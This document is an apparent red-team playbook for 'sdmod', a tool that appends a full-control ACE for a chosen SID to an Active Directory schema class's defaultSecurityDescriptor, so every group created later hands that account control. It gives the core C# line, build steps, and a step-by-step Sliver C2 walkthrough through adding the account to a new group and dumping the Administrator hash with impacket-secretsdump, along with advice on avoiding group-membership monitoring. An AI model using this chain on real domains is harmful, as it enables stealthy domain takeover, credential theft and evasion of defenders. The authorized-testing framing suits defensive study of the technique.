# sdmod — AD Schema Security Descriptor Modification Playbook

**Language**: **English** | [中文](TUTORIAL.zh-CN.md) | [Français](TUTORIAL.fr.md)

> For red teaming / authorized penetration testing: by poisoning the `defaultSecurityDescriptor` of the AD Schema, grant a specified SID full control over every object of that class created afterwards, without joining any high-risk group.
>
> ⚠️ This playbook and the accompanying tool are for **authorized testing environments only** (labs, ranges, engagements with written authorization). Do not use on unauthorized production systems. All domain names, accounts, passwords, and SIDs in the examples are fictional placeholders.

---

## 1. Background and Goal

After obtaining a low-privileged domain account (e.g. `redpen`), the usual privilege-escalation path is to add it to high-risk groups such as `Domain Admins`. That generates a lot of monitoring noise: defenders typically watch privileged-group `Member` changes closely (Windows security log **Event ID 4728 / 4732**) and will spot it quickly.

The goal of this approach:

- **Do not modify any group membership**, bypassing the usual monitoring;
- Modify the `defaultSecurityDescriptor` of a class in the AD **Schema** partition — "poison the template";
- Any **object of that class created in the future** (e.g. a new group) automatically gets a **full-control** ACE (the same rights as Domain Admins) for the given SID (e.g. `redpen`'s SID) when its ACL is initialized;
- Achieve long-term, stealthy, sustainable privilege persistence: `redpen` never needs to join any privileged group, yet can take over any privileged group created later.

---

## 2. Why Not Use Existing Tools

We first tried `sharpview`, `sharpsh`, `nps` and other existing tools, but in practice (in the Mono build environment at the time) they all failed for various reasons:

- **Mono vs Windows-native security API incompatibility**: binary security descriptors produced by the `System.Security.AccessControl` namespace are rejected by the DC, consistently triggering "server unwilling to process";
- **SDDL / security-descriptor format validation differences**: even P/Invoking `advapi32.dll` native APIs left format-validation differences on the DS-type security descriptors in the schema partition;
- **FSMO role location**: schema object modification must hit the DC holding the **Schema Master** FSMO role; auto-selection most likely lands on an ordinary DC and gets refused.

Rather than patching the source of those three tools, **write a minimal tool ourselves** for this exact scenario, while keeping the Sliver C2 in-process execution requirement in mind.

---

## 3. Tool Design: sdmod

### 3.1 Core Logic

`sdmod` is a minimal C# console program that binds to a DC over LDAP, reads the target object's security descriptor in its SDDL string form, appends a full-control allow ACE for the given SID, and writes the new SDDL string back to the AD attribute, letting the DC natively parse and convert the change.

**Arguments (5):**

| Argument | Description |
|---|---|
| `<LDAP Path>` | LDAP object path, e.g. `LDAP://dc.redteamnotes.local/CN=Group,CN=Schema,...` |
| `<User>` | Auth user (`domain\user`) |
| `<Pass>` | Password |
| `<AttrName>` | Target attribute (e.g. `defaultSecurityDescriptor`) |
| `<TrusteeSID>` | SID to grant rights to |

**Source**: see [`sdmod.cs`](../sdmod.cs) at the repo root (compile-time reference is only `System.DirectoryServices`, no third-party dependencies). The core logic is one line — append the allow ACE with the same rights as Domain Admins:

```csharp
string newAce = "(A;;RPWPCRCCDCLCLORCWOWDSDDTSW;;;" + trusteeSid + ")";
string newSddl = originalSddl + newAce;
```

### 3.2 Key Design Trade-offs (each an engineering compromise from real pitfalls)

| Trade-off | Rationale |
|---|---|
| **Raw SDDL string instead of binary security descriptors** | Standard `CommonSecurityDescriptor` binary operations emit formats the DC rejects under Mono; operating on the SDDL string directly is parsed and converted natively by the DC, identical to what ADSI editor / `Set-ADObject` do under the hood, giving the highest format compatibility. The attribute itself returns SDDL as a string, proving the string form is natively supported by AD. |
| **Append an ACE instead of replacing the whole SDDL** | Schema-partition descriptors contain object-type ACEs (OA), implicit owner and primary group; hand-crafting the full descriptor is error-prone. Appending only adds rights and preserves 100% of the default configuration, matching the "minimal impact, minimal footprint" principle. |
| **`System.DirectoryServices` only** | Deliberately avoids Mono-incompatible namespaces such as `System.Security.AccessControl`. The cost is a lack of strong type-checking; the payoff is maximal compatibility: small size, no extra dependencies, stable across versions, fits Sliver in-process injection. |
| **Explicit `ServerBind` to bypass auto-selection** | Without it, the Windows-native DC locator may pick an ordinary DC; binding the named server explicitly removes the FSMO-role location failure mode at the root. |
| **Pass the SID directly, not the account name** | Security descriptors identify principals by SID; passing the SID directly skips the name-to-SID resolution, fewer API calls and fewer failure points, matching the red-team flow (the SID is usually already known). |
| **`Secure` binding** | Enables LDAP signing/encryption to avoid cleartext credentials and satisfies the DC's default security policy. |

### 3.3 SDDL in a Nutshell

The `defaultSecurityDescriptor` attribute is stored and returned as an **SDDL** string — the Security Descriptor Definition Language, Microsoft's human-readable text syntax for security descriptors. The DC parses SDDL natively, so writing an SDDL string is exactly equivalent to modifying the descriptor via ADSI editor or `Set-ADObject`: no manual binary conversion is ever involved.

Taking the value queried in 5.1 as an example:

```text
D:(A;;RPWPCRCCDCLCLORCWOWDSDDTSW;;;DA)(A;;RPWPCRCCDCLCLORCWOWDSDDTSW;;;SY)(A;;RPLCLORC;;;AU)(A;;RPWPCRCCDCLCLORCWOWDSDDTSW;;;AO)(A;;RPLCLORC;;;PS)(OA;;CR;ab721a55-1e2f-11d0-9819-00aa0040529b;;AU)(OA;;RP;46a9b11d-60ae-405a-b7e8-ff8a58d456d2;;S-1-5-32-560)
```

- `D:` — prefix identifying a **DACL** (Discretionary Access Control List); each `(...)` block is one **ACE** (Access Control Entry).
- An ACE is a six-field, semicolon-separated tuple: `(type;flags;rights;object_guid;inherit_object_guid;trustee)`.

**Rights codes used in this descriptor:**

| Code | Meaning | Code | Meaning |
|---|---|---|---|
| `RP` | Read Property | `RC` | Read Control |
| `WP` | Write Property | `WD` | Write DAC (change permissions) |
| `CR` | Create Child | `SD` | Delete |
| `CC` | Create All Child | `DT` | Delete Tree |
| `DC` | Delete Child | `SW` | Self Write |
| `LC` | List Children | `LO` | List Object |

Decoding the entries from 5.1 (`A` = **Access Allowed**, i.e. an allow ACE; the two `OA` entries are object-type ACEs — see below):

| Entry | Trustee | Rights |
|---|---|---|
| `(A;;RPWPCRCCDCLCLORCWOWDSDDTSW;;;DA)` | Domain Admins | full control |
| `(A;;RPWPCRCCDCLCLORCWOWDSDDTSW;;;SY)` | SYSTEM | full control |
| `(A;;RPLCLORC;;;AU)` | Authenticated Users | read (RP + LC + LO + RC) |
| `(A;;RPWPCRCCDCLCLORCWOWDSDDTSW;;;AO)` | Account Operators | full control |
| `(A;;RPLCLORC;;;PS)` | Print Operators | read |
| `(OA;;CR;ab721a55-...;;AU)` | Authenticated Users | object ACE — create child objects of the class identified by the GUID |
| `(OA;;RP;46a9b11d-...;;S-1-5-32-560)` | Windows Authorization Access Group | object ACE — read a specific property identified by the GUID |

The combined code `RPWPCRCCDCLCLORCWOWDSDDTSW` spans every directory-service object right — i.e. full control, the same rights Domain Admins hold. The trustee names (`DA`, `SY`, `AU`, `AO`, `PS`) are SDDL aliases for well-known SIDs — Domain Admins, SYSTEM, Authenticated Users, Account Operators and Print Operators respectively.

The two `OA` entries are **object-type ACEs**: `OA` stands for **Object Access Allowed**. Unlike a plain `A` ACE, an `OA` ACE carries an extra ObjectType GUID and is scoped to objects or properties of the class identified by that GUID (a schemaIDGUID) — the first entry gates creation of a specific child-object class, the second gates reads of a specific property. This is a schema-partition peculiarity that a plain allow ACE cannot express.

**What the tool appends** — one allow ACE granting the trustee SID the same full-control rights as Domain Admins:

```text
(A;;RPWPCRCCDCLCLORCWOWDSDDTSW;;;S-1-5-21-xxxxxxxxxx-xxxxxxxxxx-xxxxxxxxxx-xxxx)
```

Type `A` (Access Allowed), empty flags and GUIDs, the full-control rights string, and the target SID. Because it is appended — never replacing the descriptor — every existing entry (including the two `OA` ACEs, the implicit owner, and the primary group) is preserved.

---

## 4. Build

Environment: Kali / Mono (`Mono C# compiler version 6.14.1.0`)

```bash
# Fetch the source (single file)
curl -O https://raw.githubusercontent.com/RedteamNotes/sdmod/main/sdmod.cs

# Install build dependencies (Debian / Kali)
sudo apt update
sudo apt install -y mono-mcs mono-devel

# Minimal usable version
mcs sdmod.cs -out:sdmod.exe -r:System.DirectoryServices.dll

# Recommended (force x64 + no debug-symbol file)
mcs sdmod.cs -out:sdmod.exe -r:System.DirectoryServices.dll -platform:x64 -debug-
```

**Flag notes:**

| Flag | Effect |
|---|---|
| `-platform:x64` | Forces the x64 target to match the Sliver beacon architecture, avoiding in-process injection architecture mismatch |
| `-debug-` | Skips the .mdb debug-symbol file |

The basic build is enough; the output is about 4-6 KB. `-optimize` and similar flags give a negligible benefit on a program this small, and `-nologo` only suppresses the compiler banner with no effect on the output — don't pile up flags for "stealth"; the real wins are only `-platform:x64` and `-debug-`.

---

## 5. Walkthrough

> Environment: domain `redteamnotes.local`, DC `dc.redteamnotes.local`, low-privileged account `redpen`. All operations run inside a Sliver beacon (`hairpin-turn`) session.

### 5.1 Query the Original Value (record for rollback)

Before modifying, query the current value and record the original SDDL:

```text
sliver > sa-ldapsearch -- -query "(name=Group)" -dn "CN=Schema,CN=Configuration,DC=redteamnotes,DC=local" -hostname dc.redteamnotes.local -attributes defaultSecurityDescriptor
```

Output (original value):

```text
defaultSecurityDescriptor: D:(A;;RPWPCRCCDCLCLORCWOWDSDDTSW;;;DA)(A;;RPWPCRCCDCLCLORCWOWDSDDTSW;;;SY)(A;;RPLCLORC;;;AU)(A;;RPWPCRCCDCLCLORCWOWDSDDTSW;;;AO)(A;;RPLCLORC;;;PS)(OA;;CR;ab721a55-1e2f-11d0-9819-00aa0040529b;;AU)(OA;;RP;46a9b11d-60ae-405a-b7e8-ff8a58d456d2;;S-1-5-32-560)
```

### 5.2 Run the Modification

```text
sliver > execute-assembly --in-process sdmod.exe -- "LDAP://dc.redteamnotes.local/CN=Group,CN=Schema,CN=Configuration,DC=redteamnotes,DC=local" "redteamnotes\redpen" "P@ssw0rd" "defaultSecurityDescriptor" "S-1-5-21-xxxxxxxxxx-xxxxxxxxxx-xxxxxxxxxx-xxxx"
```

Output: `[+] Success: ACE added successfully`

> ⚠️ The password `P@ssw0rd` appears in cleartext in the `execute-assembly` arguments (visible in process listings). This is an inherent exposure of this flow: accept it, or use a context that already holds credentials.

### 5.3 Verify (compare with the original)

Re-run the 5.1 query — a new ACE is now appended at the end:

```text
defaultSecurityDescriptor: D:(A;;RPWPCRCCDCLCLORCWOWDSDDTSW;;;DA)(A;;RPWPCRCCDCLCLORCWOWDSDDTSW;;;SY)(A;;RPLCLORC;;;AU)(A;;RPWPCRCCDCLCLORCWOWDSDDTSW;;;AO)(A;;RPLCLORC;;;PS)(OA;;CR;ab721a55-1e2f-11d0-9819-00aa0040529b;;AU)(OA;;RP;46a9b11d-60ae-405a-b7e8-ff8a58d456d2;;S-1-5-32-560)(A;;RPWPCRCCDCLCLORCWOWDSDDTSW;;;S-1-5-21-xxxxxxxxxx-xxxxxxxxxx-xxxxxxxxxx-xxxx)
```

### 5.4 Wait for the Change to Take Effect

**Key: wait about 3-5 minutes after the write for the permission to take effect; 1-2 minutes will not work.** If you don't wait long enough, the subsequent add-to-group fails (e.g. `Unable to add user to group 5` / `Adding user to group failed: 560`).

### 5.5 Impersonate the Target (make-token)

Impersonate `redpen` on the beacon thread so subsequent network operations use `redpen`'s credentials:

```text
sliver > make-token -d redteamnotes.local -u redpen -p 'P@ssw0rd'
```

> Note: Sliver's `make-token` uses `LOGON32_LOGON_NEW_CREDENTIALS` by default — local actions still run as the original process identity; only outbound network connections carry the new credentials. You can change it with `--logon-type`.

### 5.6 Add to Group (high-OPSEC BOF)

Use the `remote-addusertogroup` BOF to add `redpen` to the target group:

```text
sliver > remote-addusertogroup -- --username redpen --server dc.redteamnotes.local --domain redteamnotes.local --groupname new_admingroup
```

- **If the change hasn't taken effect yet**: error `Unable to add user to group 5 ... Adding user to group failed: 560`;
- **After waiting 3-5 minutes**: output `SUCCESS.`

### 5.7 Verify Membership

```text
sliver > sa-ldapsearch -- -query "(sAMAccountName=redpen)" -dn "DC=redteamnotes,DC=local" -hostname dc.redteamnotes.local -attributes "sAMAccountName,cn,servicePrincipalName,memberOf"
```

Output — `memberOf` now includes the target group:

```text
memberOf: CN=new_admingroup,CN=Users,DC=redteamnotes,DC=local, CN=webadmins,DC=redteamnotes,DC=local, CN=Schema Admins,CN=Users,DC=redteamnotes,DC=local
```

### 5.8 Dump Immediately (verify and exploit)

**Once the membership lands, the group permission may fall back within minutes — it's a countdown.** Prepare the dump command in advance and run it right after the add succeeds:

```bash
impacket-secretsdump redteamnotes.local/redpen:'P@ssw0rd'@dc.redteamnotes.local -just-dc-user administrator
```

A successful dump proves the privilege chain (you get `Administrator`'s NTLM hash and Kerberos keys). If it fails, first check whether the group was actually added. You can repeat the operations; there is no need to be nervous.

---

## 6. Concepts: Group Membership vs Default Security Descriptor

Two concepts that are easy to confuse:

| Concept | Description |
|---|---|
| **Group membership (Member)** | "Who is in which group." Blue team closely monitors privileged-group `Member` changes (Event ID 4728/4732); directly adding to `Domain Admins` is very noisy and easy to spot. |
| **defaultSecurityDescriptor** | The "blueprint/template" defined in the AD Schema, under `CN=Schema`. Modifying it is like using `Set-ADObject` to change a class template. |

**Real effect of template poisoning:**

- Groups that **already exist** in the domain: their permissions **do not change**;
- Any group **created after** the command: when its ACL is initialized it reads the tampered `defaultSecurityDescriptor`;
- Because the descriptor hardcodes `redpen`'s SID with elevated rights, **every future new group gives `redpen` full control** (the same rights as Domain Admins).

**Where the stealth comes from:** no membership change, bypassing routine monitoring. If IT later creates a privileged group for a core business, `redpen` can modify its members or take it over via ACL without ever joining it — long-term, very stealthy persistence.

---

## 7. OPSEC Notes and Caveats

1. **No high-risk group membership**: never triggers membership-change monitoring;
2. **Waiting window**: about 3-5 minutes for the change to take effect; too early fails;
3. **Dump fast**: after membership lands the group permission is on a countdown; have the dump command ready;
4. **Rollback**: record the original SDDL before modifying (see 5.1);
5. **Minimal impact**: append-only strategy, doesn't break the existing ACL structure;
6. **Execution form**: prefer BOF / `execute-assembly --in-process` to avoid disk artifacts; if you BOF-ify it, prefer a thin wrapper over existing LDAP BOF primitives rather than rewriting the C LDAP layer;
7. **Re-running**: running the same SID again appends the same ACE repeatedly (no idempotency); restore from the recorded original SDDL (5.1) if needed.

---

## 8. Naming and Maintenance

- **Name**: `sdmod` (SD = Security Descriptor, mod = modify; a short name to remember, the README carries the rigor)
- **Repo**: `github.com/RedteamNotes/sdmod` (public)
- **Compatibility**: builds with .NET Framework / Mono; if BOF-ified, prefer a thin wrapper over existing LDAP BOF primitives.

---

*Domain names, accounts, passwords, and SIDs in the examples are fictional; this document is for authorized testing and security research only.*
